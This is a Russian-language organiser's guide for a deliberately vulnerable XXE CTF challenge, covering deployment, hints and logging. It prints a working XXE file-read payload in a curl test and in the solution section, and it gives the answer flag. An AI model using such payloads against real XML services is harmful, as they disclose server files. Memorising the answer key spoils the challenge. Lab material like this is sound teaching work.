# 📋 Руководство для организаторов CTF

Это руководство предназначено для организаторов CTF соревнований, которые хотят использовать этот сервис в своих мероприятиях.

## 🎯 Обзор

**Тип уязвимости:** XML External Entity (XXE)  
**Сложность:** Легкая / Средняя  
**Категория:** Web  
**Очки:** 100-200 (рекомендуется)  
**Время на решение:** 15-45 минут (в зависимости от опыта)

## 🚀 Быстрое развертывание

### Вариант 1: Docker Compose (рекомендуется)

```bash
# Клонируйте или скопируйте файлы
cd xxe-ctf-service

# Запустите сервис
docker-compose up -d

# Проверьте статус
docker-compose ps

# Проверьте логи
docker-compose logs -f
```

### Вариант 2: Docker без Compose

```bash
# Соберите образ
docker build -t xxe-ctf-service .

# Запустите контейнер
docker run -d -p 5000:5000 --name xxe-ctf xxe-ctf-service

# Проверьте статус
docker ps
```

### Вариант 3: Локальный запуск (для тестирования)

```bash
# Установите зависимости
pip install -r requirements.txt

# Запустите приложение
python app.py
```

## 🔧 Конфигурация

### Изменение флага

1. **Простой способ** (без пересборки):

```bash
# Измените flag.txt
echo "centralctf{your_custom_flag_here}" > flag.txt

# Перезапустите с новым флагом
docker-compose down
docker-compose up -d
```

2. **С пересборкой**:

```bash
# Измените flag.txt
echo "centralctf{your_custom_flag_here}" > flag.txt

# Пересоберите образ
docker-compose up -d --build
```

### Изменение порта

Отредактируйте `docker-compose.yml`:

```yaml
services:
  xxe-ctf:
    ports:
      - "8080:5000"  # Используйте любой удобный порт
```

### Настройка для продакшена

Для публичного CTF рекомендуется:

1. **Использовать reverse proxy (nginx/traefik)**

```nginx
server {
    listen 80;
    server_name xxe-challenge.yourctf.com;

    location / {
        proxy_pass http://localhost:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

2. **Ограничить rate limiting**

```nginx
limit_req_zone $binary_remote_addr zone=xxe:10m rate=10r/s;

location /api/parse {
    limit_req zone=xxe burst=20;
    proxy_pass http://localhost:5000;
}
```

3. **Добавить мониторинг**

```yaml
# docker-compose.yml
services:
  xxe-ctf:
    logging:
      driver: "json-file"
      options:
        max-size: "10m"
        max-file: "3"
```

## 📊 Мониторинг и логи

### Просмотр логов

```bash
# Все логи
docker-compose logs

# Последние логи с обновлением
docker-compose logs -f --tail=100

# Логи конкретного контейнера
docker logs xxe-ctf-service
```

### Проверка производительности

```bash
# Использование ресурсов
docker stats xxe-ctf-service

# Информация о контейнере
docker inspect xxe-ctf-service
```

## ✅ Тестирование перед запуском

### 1. Автоматический тест

```bash
./test_service.sh
```

Скрипт проверит:
- Доступность сервиса
- Работу API
- Наличие уязвимости XXE
- Возможность получения флага
- Работу вспомогательных страниц

### 2. Ручное тестирование

```bash
# Проверка главной страницы
curl http://localhost:5000

# Проверка API
curl -X POST http://localhost:5000/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><test><value>hello</value></test>'

# Проверка XXE
curl -X POST http://localhost:5000/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<data><value>&xxe;</value></data>'
```

### 3. Использование скрипта решения

```bash
python3 solve.py -v
```

## 📝 Описание задания для участников

### Краткое описание (для списка заданий)

```
Название: XML Parser Service
Категория: Web
Сложность: Easy/Medium
Очки: 150

Описание:
Мы разработали современный сервис для парсинга XML документов. 
Проверьте его безопасность и найдите флаг!

URL: http://your-ctf-server.com:5000
Формат флага: centralctf{...}
```

### Полное описание

```markdown
# XML Parser Service

## Описание
Компания разработала веб-сервис для обработки XML документов. 
Сервис принимает XML через API и возвращает обработанные данные.

## Задание
Найдите уязвимость в сервисе и получите флаг.

## Подсказки
- Сервис обрабатывает XML документы
- Флаг хранится на сервере в файле
- Формат флага: centralctf{...}

## Полезные ресурсы
- OWASP Top 10
- XML спецификация
- Документация по безопасности парсеров

## Доступ
URL: http://your-ctf-server.com:5000
```

## 🎓 Уровни подсказок

Если участники застряли, можно давать подсказки постепенно:

### Подсказка 1 (5 минут)
```
Изучите, какие данные принимает сервис и как он их обрабатывает.
Попробуйте отправить различные XML документы.
```

### Подсказка 2 (15 минут)
```
XML поддерживает концепцию "сущностей" (entities).
Есть внутренние и внешние сущности.
Исследуйте, как сервер обрабатывает XML сущности.
```

### Подсказка 3 (25 минут)
```
Внешние сущности могут ссылаться на локальные файлы через протокол file://.
Подумайте, где может храниться флаг на сервере.
```

### Подсказка 4 (35 минут)
```
Используйте конструкцию:
<!DOCTYPE data [
  <!ENTITY имя SYSTEM "file:///путь/к/файлу">
]>

Флаг находится в /app/flag.txt
```

## 🔍 Решение (для проверки)

### Правильный ответ

**Флаг:** `centralctf{xxe_1s_d4ng3r0us_p4rs1ng_vuln3r4b1l1ty}`

### Путь решения

1. Открыть веб-интерфейс
2. Отправить тестовый XML
3. Проверить обработку XML entities
4. Создать XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<data>
  <value>&xxe;</value>
</data>
```

5. Получить флаг из ответа сервера

## 📈 Статистика и аналитика

### Метрики для отслеживания

- Количество попыток на `/api/parse`
- Среднее время решения
- Процент участников, использовавших подсказки
- Популярные методы решения

### Анализ логов

```bash
# Количество запросов к API
docker-compose logs | grep "/api/parse" | wc -l

# Успешные попытки (поиск флага в логах)
docker-compose logs | grep "centralctf{" | wc -l

# Ошибки парсинга
docker-compose logs | grep "error" | wc -l
```

## 🛡️ Безопасность развертывания

### Что НУЖНО делать

✅ Использовать изолированную сеть Docker  
✅ Ограничить ресурсы контейнера  
✅ Настроить rate limiting  
✅ Регулярно проверять логи  
✅ Использовать firewall  
✅ Резервное копирование конфигурации

### Что НЕ НУЖНО делать

❌ Не запускайте на порту 80/443 без reverse proxy  
❌ Не используйте в production без изоляции  
❌ Не оставляйте SSH порты открытыми  
❌ Не храните чувствительные данные в контейнере  
❌ Не забывайте менять флаг для каждого CTF

## 🔄 Обновления и поддержка

### Обновление сервиса

```bash
# Получить последнюю версию
git pull

# Пересобрать образ
docker-compose build --no-cache

# Перезапустить с новой версией
docker-compose up -d
```

### Создание резервной копии

```bash
# Экспорт образа
docker save xxe-ctf-service:latest > xxe-ctf-backup.tar

# Экспорт конфигурации
tar -czf config-backup.tar.gz docker-compose.yml flag.txt

# Восстановление
docker load < xxe-ctf-backup.tar
docker-compose up -d
```

## 🐛 Troubleshooting

### Проблема: Контейнер не запускается

**Решение:**
```bash
# Проверьте логи
docker-compose logs

# Проверьте порты
netstat -tlnp | grep 5000

# Пересоберите образ
docker-compose build --no-cache
docker-compose up -d
```

### Проблема: Флаг не читается

**Решение:**
```bash
# Проверьте наличие файла в контейнере
docker exec xxe-ctf-service cat /app/flag.txt
docker exec xxe-ctf-service cat /flag.txt

# Проверьте права доступа
docker exec xxe-ctf-service ls -la /app/flag.txt
```

### Проблема: Высокая нагрузка

**Решение:**
```bash
# Ограничьте ресурсы в docker-compose.yml
services:
  xxe-ctf:
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M
```

## 📊 Шаблон отчета после CTF

```markdown
# Отчет по заданию "XML Parser Service"

## Статистика
- Участников: XX
- Решили задание: XX (XX%)
- Среднее время: XX минут
- Использовали подсказки: XX (XX%)

## Популярные методы
1. Веб-интерфейс: XX%
2. curl: XX%
3. Скрипты: XX%
4. Burp Suite: XX%

## Проблемы
- [Описание проблем, если были]

## Рекомендации
- [Рекомендации по улучшению]
```

## 📚 Дополнительные материалы

### Для участников
- README.md - общее описание
- QUICKSTART.md - быстрый старт
- Страница /hint - подсказки в интерфейсе

### Для решения
- SOLUTION.md - подробное решение
- exploits.md - различные варианты эксплойтов
- solve.py - автоматический скрипт

### Для обучения
- Примеры безопасного кода
- Ссылки на OWASP
- Документация по XXE

## 🤝 Контакты и поддержка

При возникновении проблем:
1. Проверьте документацию
2. Запустите test_service.sh
3. Изучите логи
4. Создайте issue в репозитории

## 📄 Лицензия и использование

Этот сервис создан для образовательных целей.  
Свободно используйте в своих CTF соревнованиях.

**Требования:**
- Указывайте, что задание уязвимо намеренно
- Не используйте в production
- Изолируйте от других сервисов
- Меняйте флаг для каждого мероприятия

---

**Удачи в организации CTF! 🎯🚀**

Если у вас есть вопросы или предложения по улучшению, создайте issue или pull request.